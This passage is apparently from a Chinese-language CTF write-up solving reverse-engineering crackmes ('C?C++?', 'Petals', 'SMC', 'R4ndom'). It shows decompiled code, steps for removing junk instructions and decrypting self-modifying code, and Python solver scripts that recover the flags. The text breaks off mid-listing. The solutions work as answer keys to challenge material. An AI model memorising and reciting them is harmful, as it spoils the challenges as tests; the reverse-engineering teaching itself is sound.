class="number">84</span>, <span class="number">84</span>, <span class="number">189</span>, <span class="number">193</span>, <span class="number">30</span>, <span class="number">63</span>, <span class="number">104</span>, <span class="number">178</span>, <span class="number">130</span>, <span class="number">211</span>, <span class="number">164</span>, <span class="number">94</span>, <span class="number">75</span>, <span class="number">16</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">193</span>, <span class="number">160</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">30</span>, <span class="number">127</span>, <span class="number">157</span>, <span class="number">66</span>, <span class="number">163</span>, <span class="number">181</span>, <span class="number">177</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">236</span>, <span class="number">106</span>, <span class="number">107</span>, <span class="number">144</span>, <span class="number">231</span>, <span class="number">250</span>, <span class="number">16</span>, <span class="number">36</span>, <span class="number">34</span>, <span class="number">91</span>, <span class="number">9</span>, <span class="number">188</span>, <span class="number">81</span>, <span class="number">5</span>, <span class="number">241</span>, <span class="number">235</span>, <span class="number">3</span>, <span class="number">54</span>, <span class="number">150</span>, <span class="number">40</span>, <span class="number">119</span>, <span class="number">202</span>, <span class="number">150</span>]</span><br><span class="line">username = <span class="string">&#x27;genshinimpact&#x27;</span></span><br><span class="line">enc_pass = <span class="string">&#x27;YnwgY2txbE8TRyQecyE1bE8DZWMkMiRgJW1=&#x27;</span></span><br><span class="line">retval = rc4(username,base64_table)</span><br><span class="line">password = decode(enc_pass)</span><br><span class="line"><span class="built_in">print</span>(password.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到flag</p><img src="/posts/843a2f5ea22b/image-20231003091900374.png" class="" title="image-20231003091900374"><h3 id="C-C"><a href="#C-C" class="headerlink" title="C?C++?"></a>C?C++?</h3><p>用<strong>ghidra</strong>分析一下，发现是C#程序</p><img src="/posts/843a2f5ea22b/image-20231003095205443.png" class="" title="image-20231003095205443"><p>使用<strong>dnSpy</strong>反编译得到源码</p><p>分析之后发现只有array1、array2和array3与flag相关，感觉有点问题</p><p>换成用<strong>Reflector</strong>反编译</p><p>源码如下</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">unsafe</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">int</span> num = <span class="number">0x23</span>;</span><br><span class="line">    <span class="built_in">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">int</span>[] numArray = <span class="keyword">new</span> <span class="built_in">int</span>[] &#123; </span><br><span class="line">        <span class="number">0x44</span>, <span class="number">0x4b</span>, <span class="number">0x42</span>, <span class="number">0x48</span>, <span class="number">0x63</span>, <span class="number">0x13</span>, <span class="number">0x13</span>, <span class="number">0x4e</span>, <span class="number">0x53</span>, <span class="number">0x4a</span>, <span class="number">0x5b</span>, <span class="number">0x56</span>, <span class="number">0x23</span>, <span class="number">0x27</span>, <span class="number">0x4d</span>, <span class="number">0x55</span>,</span><br><span class="line">        <span class="number">0x2c</span>, <span class="number">0x59</span>, <span class="number">0x2f</span>, <span class="number">0x5c</span>, <span class="number">0x31</span>, <span class="number">0x58</span>, <span class="number">0x30</span>, <span class="number">0x5b</span>, <span class="number">0x58</span>, <span class="number">0x66</span>, <span class="number">0x69</span>, <span class="number">0x33</span>, <span class="number">0x4c</span>, <span class="number">0x73</span>, <span class="number">-124</span>, <span class="number">0x7d</span>,</span><br><span class="line">        <span class="number">0x4f</span>, <span class="number">0x7a</span>, <span class="number">-103</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">char</span>[] chArray = <span class="keyword">new</span> <span class="built_in">char</span>[<span class="number">0x23</span>];</span><br><span class="line">    <span class="built_in">int</span>[] numArray2 = <span class="keyword">new</span> <span class="built_in">int</span>[<span class="number">0x23</span>];</span><br><span class="line">    Console.Write(<span class="string">&quot;Input your flag: &quot;</span>);</span><br><span class="line">    <span class="built_in">string</span> str = Console.ReadLine();</span><br><span class="line">    <span class="built_in">int</span> num3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (num3 &gt;= str.Length)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> str2 = <span class="string">&quot;NEWSTAR&quot;</span>;</span><br><span class="line">            <span class="built_in">int</span> num4 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (num4 &gt;= num)</span><br><span class="line">                &#123;</span><br><span class="line">                    index = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (index &gt;= <span class="number">7</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">int</span> num5 = <span class="number">0</span>;</span><br><span class="line">                            <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="keyword">if</span> (num5 &gt;= num)</span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="built_in">int</span> num7 = <span class="number">0</span>;</span><br><span class="line">                                    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">                                    &#123;</span><br><span class="line">                                        <span class="keyword">if</span> (num7 &gt;= <span class="number">0x23</span>)</span><br><span class="line">                                        &#123;</span><br><span class="line">                                            <span class="keyword">break</span>;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                        <span class="keyword">if</span> ((num7 == <span class="number">0x22</span>) &amp;&amp; (numArray2[num7] == numArray[num7]))</span><br><span class="line">                                        &#123;</span><br><span class="line">                                            Console.WriteLine(<span class="string">&quot;Right!&quot;</span>);</span><br><span class="line">                                        &#125;</span><br><span class="line">                                        <span class="keyword">if</span> (numArray2[num7] != numArray[num7])</span><br><span class="line">                                        &#123;</span><br><span class="line">                                            Console.WriteLine(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">                                            <span class="keyword">break</span>;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                        num7++;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="keyword">return</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                numArray2[num5] = chArray[num5];</span><br><span class="line">                                num5++;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="built_in">char</span>* chPtr3 = &amp;(chArray[index]);</span><br><span class="line">                        chPtr3[<span class="number">0</span>] = (<span class="built_in">char</span>) (chPtr3[<span class="number">0</span>] + ((<span class="built_in">char</span>) (index ^ -(str2[index] % <span class="string">&#x27;\x0004&#x27;</span>))));</span><br><span class="line">                        <span class="built_in">char</span>* chPtr4 = &amp;(chArray[index + <span class="number">7</span>]);</span><br><span class="line">                        chPtr4[<span class="number">0</span>] = (<span class="built_in">char</span>) (chPtr4[<span class="number">0</span>] + ((<span class="built_in">char</span>) (str2[index] % <span class="string">&#x27;\x0005&#x27;</span>)));</span><br><span class="line">                        <span class="built_in">char</span>* chPtr5 = &amp;(chArray[index + <span class="number">14</span>]);</span><br><span class="line">                        chPtr5[<span class="number">0</span>] = (<span class="built_in">char</span>) (chPtr5[<span class="number">0</span>] + ((<span class="built_in">char</span>) (<span class="number">2</span> * index)));</span><br><span class="line">                        <span class="built_in">char</span>* chPtr6 = &amp;(chArray[index + <span class="number">0x15</span>]);</span><br><span class="line">                        chPtr6[<span class="number">0</span>] = (<span class="built_in">char</span>) (chPtr6[<span class="number">0</span>] + ((<span class="built_in">char</span>) (index ^ <span class="number">2</span>)));</span><br><span class="line">                        <span class="built_in">char</span>* chPtr7 = &amp;(chArray[index + <span class="number">0x1c</span>]);</span><br><span class="line">                        chPtr7[<span class="number">0</span>] = (<span class="built_in">char</span>) (chPtr7[<span class="number">0</span>] + ((<span class="built_in">char</span>) ((str2[index] / <span class="string">&#x27;\x0005&#x27;</span>) + <span class="number">10</span>)));</span><br><span class="line">                        index++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">char</span>* chPtr1 = &amp;(chArray[num4]);</span><br><span class="line">                chPtr1[<span class="number">0</span>] = (<span class="built_in">char</span>) (chPtr1[<span class="number">0</span>] + ((<span class="built_in">char</span>) num4));</span><br><span class="line">                <span class="built_in">char</span>* chPtr2 = &amp;(chArray[num4]);</span><br><span class="line">                chPtr2[<span class="number">0</span>] = (<span class="built_in">char</span>) (chPtr2[<span class="number">0</span>] - <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">                num4++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        chArray[num3] = str[num3];</span><br><span class="line">        num3++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入先被放进chArray</p><p>接着在一个循环里，每一位输入的字符加上位数再减去空格的ASCII码</p><p>第二轮里与str2进行一些处理</p><p>编写解题脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">array = [</span><br><span class="line"><span class="number">68</span>,</span><br><span class="line"><span class="number">75</span>,</span><br><span class="line"><span class="number">66</span>,</span><br><span class="line"><span class="number">72</span>,</span><br><span class="line"><span class="number">99</span>,</span><br><span class="line"><span class="number">19</span>,</span><br><span class="line"><span class="number">19</span>,</span><br><span class="line"><span class="number">78</span>,</span><br><span class="line"><span class="number">83</span>,</span><br><span class="line"><span class="number">74</span>,</span><br><span class="line"><span class="number">91</span>,</span><br><span class="line"><span class="number">86</span>,</span><br><span class="line"><span class="number">35</span>,</span><br><span class="line"><span class="number">39</span>,</span><br><span class="line"><span class="number">77</span>,</span><br><span class="line"><span class="number">85</span>,</span><br><span class="line"><span class="number">44</span>,</span><br><span class="line"><span class="number">89</span>,</span><br><span class="line"><span class="number">47</span>,</span><br><span class="line"><span class="number">92</span>,</span><br><span class="line"><span class="number">49</span>,</span><br><span class="line"><span class="number">88</span>,</span><br><span class="line"><span class="number">48</span>,</span><br><span class="line"><span class="number">91</span>,</span><br><span class="line"><span class="number">88</span>,</span><br><span class="line"><span class="number">102</span>,</span><br><span class="line"><span class="number">105</span>,</span><br><span class="line"><span class="number">51</span>,</span><br><span class="line"><span class="number">76</span>,</span><br><span class="line"><span class="number">115</span>,</span><br><span class="line">-<span class="number">124</span>,</span><br><span class="line"><span class="number">125</span>,</span><br><span class="line"><span class="number">79</span>,</span><br><span class="line"><span class="number">122</span>,</span><br><span class="line">-<span class="number">103</span></span><br><span class="line">]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">num3 = <span class="number">0</span></span><br><span class="line">num = <span class="number">0x23</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">str2 = <span class="string">&quot;NEWSTAR&quot;</span></span><br><span class="line">num4 = <span class="number">0</span></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">if</span> index &gt;= <span class="number">7</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">if</span> num4 &gt;= num:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> array:</span><br><span class="line"><span class="keyword">if</span>(i&lt;<span class="number">0</span>):</span><br><span class="line">i+=<span class="number">256</span></span><br><span class="line">flag += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">131</span>))</span><br><span class="line">exit()</span><br><span class="line">array[num4] = array[num4] - num4</span><br><span class="line">array[num4] = array[num4] + <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">num4 += <span class="number">1</span></span><br><span class="line">array[index] = array[index] - (index ^ -(<span class="built_in">ord</span>(str2[index]) % <span class="number">4</span>))</span><br><span class="line">array[index + <span class="number">7</span>] = array[index + <span class="number">7</span>] - (<span class="built_in">ord</span>(str2[index]) % <span class="number">5</span>)</span><br><span class="line">array[index + <span class="number">14</span>] = array[index + <span class="number">14</span>] - (<span class="number">2</span> * index)</span><br><span class="line">array[index + <span class="number">0x15</span>] = array[index + <span class="number">0x15</span>] - (index ^ <span class="number">2</span>)</span><br><span class="line">array[index + <span class="number">0x1c</span>] = array[index + <span class="number">0x1c</span>] - ((<span class="built_in">ord</span>(str2[index]) // <span class="number">5</span>) + <span class="number">10</span>)</span><br><span class="line">index += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>需要注意的是，数组里有两个小于0的ASCII码，最后转为字符串时需要+256</p><p>得到flag</p><img src="/posts/843a2f5ea22b/image-20231003110625431.png" class="" title="image-20231003110625431"><h3 id="Petals"><a href="#Petals" class="headerlink" title="Petals"></a>Petals</h3><p>丢进IDA</p><p>main函数源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Here is a pack of flowers, to my best love --- you.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;But I must check your identity, please input the right passwd&quot;</span>);</span><br><span class="line">  __isoc99_scanf();</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(byte_4080);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(byte_4080) != <span class="number">25</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please check your input&#x27;s format!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)())((<span class="type">char</span> *)&amp;sub_1208 + <span class="number">1</span>))();</span><br><span class="line">  sub_160C(byte_4080, &amp;unk_4020, v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;If you are succeed, the flag is flag&#123;md5(your input)&#125;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>应该是被加了壳</p><p>结合题目名，猜测是<strong>花指令</strong>干扰了IDA</p><p>找到花指令，手动清除：将<code>0x00001208</code>设置为数据类型，还有<code>0x000013B0</code></p><img src="/posts/843a2f5ea22b/image-20231003171135549.png" class="" title="image-20231003171135549"><p>成功得到<code>sub_1029</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_1209</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-118h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-114h]</span></span><br><span class="line">  __int64 v5[<span class="number">33</span>]; <span class="comment">// [rsp+20h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+128h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">    *((_BYTE *)v5 + i) = ~(i ^ a2);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; a2 &gt; j; ++j )</span><br><span class="line">    *(_BYTE *)((<span class="type">int</span>)j + a1) = *((_BYTE *)v5 + *(<span class="type">unsigned</span> __int8 *)((<span class="type">int</span>)j + a1));</span><br><span class="line">  <span class="keyword">return</span> v6 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写exp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">c =<span class="string">&#x27;D0D085858080C58A9389928F87889F8FC584D6D1D282D3DE87&#x27;</span></span><br><span class="line">a2 = <span class="number">25</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">v5 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    r = ~(i ^ a2)</span><br><span class="line">    <span class="keyword">if</span> r&lt;<span class="number">0</span>:</span><br><span class="line">        r+=<span class="number">256</span></span><br><span class="line">    v5.append(r)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    c0 = <span class="built_in">int</span>(c[i * <span class="number">2</span>:i * <span class="number">2</span> + <span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span>(c0==v5[j]):</span><br><span class="line">            flag +=<span class="built_in">chr</span>(j)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">enc_flag = hashlib.md5(flag.encode()).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span>+enc_flag+<span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到flag</p><img src="/posts/843a2f5ea22b/image-20231003215029102.png" class="" title="image-20231003215029102"><h3 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h3><p>main函数源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  DWORD *v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v3 = (DWORD *)<span class="built_in">malloc</span>(<span class="number">0x26</span>u);</span><br><span class="line">  VirtualProtect(&amp;byte_403040, <span class="number">0x26</span>u, <span class="number">0x40</span>u, v3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please enter your flag:&quot;</span>);</span><br><span class="line">  sub_401025(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>)&amp;unk_4033D4);</span><br><span class="line">  <span class="keyword">if</span> ( NtCurrentPeb()-&gt;BeingDebugged )</span><br><span class="line">  &#123;</span><br><span class="line">    MessageBoxA(<span class="number">0</span>, <span class="string">&quot;Debug Detected!&quot;</span>, <span class="string">&quot;Warning!&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    Sleep(<span class="number">0x1388</span>u);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401042();</span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="type">int</span> (__cdecl *)(<span class="type">void</span> *, <span class="type">void</span> *))byte_403040)(&amp;unk_4033D4, &amp;unk_403020) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Win!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Lose!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里被VirtualProtect修改权限的函数为<code>byte_403040</code>，猜测其进行SMC加密</p><p>跟踪sub_401042函数可以看到加密的过程</p><img src="/posts/843a2f5ea22b/image-20231005235456210.png" class="" title="image-20231005235456210"><p>编写IDC脚本解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line">addr = <span class="number">0x403040</span>  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">    result = get_bytes(<span class="number">0x403068</span> + (i&amp;<span class="number">3</span>), <span class="number">1</span>)</span><br><span class="line">    b = get_bytes(addr +i, <span class="number">1</span>)</span><br><span class="line">    idc.patch_byte(addr + i, <span class="built_in">ord</span>(b) ^ <span class="built_in">ord</span>(result))</span><br></pre></td></tr></table></figure><p>得到正常函数</p><img src="/posts/843a2f5ea22b/image-20231006003950264.png" class="" title="image-20231006003950264"><p>反编译源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> <span class="title function_">sub_403040</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( ((<span class="type">unsigned</span> __int8)byte_4033D4[v0] ^ <span class="number">0x11</span>) + <span class="number">5</span> == (<span class="type">unsigned</span> __int8)byte_403020[v0] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ++v0 &gt;= <span class="number">32</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写解题脚本</p><p>此处要注意，由于是小端，每两个字节间要进行换位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">&#x27;827C7B75476F5761255353478425276A27686A67847D357B48357B256A7E7133&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">2</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>((<span class="built_in">int</span>(c[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>],<span class="number">16</span>)-<span class="number">5</span>)^<span class="number">0x11</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><img src="/posts/843a2f5ea22b/image-20231006010931977.png" class="" title="image-20231006010931977"><h3 id="R4ndom"><a href="#R4ndom" class="headerlink" title="R4ndom"></a>R4ndom</h3><p>反编译源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> 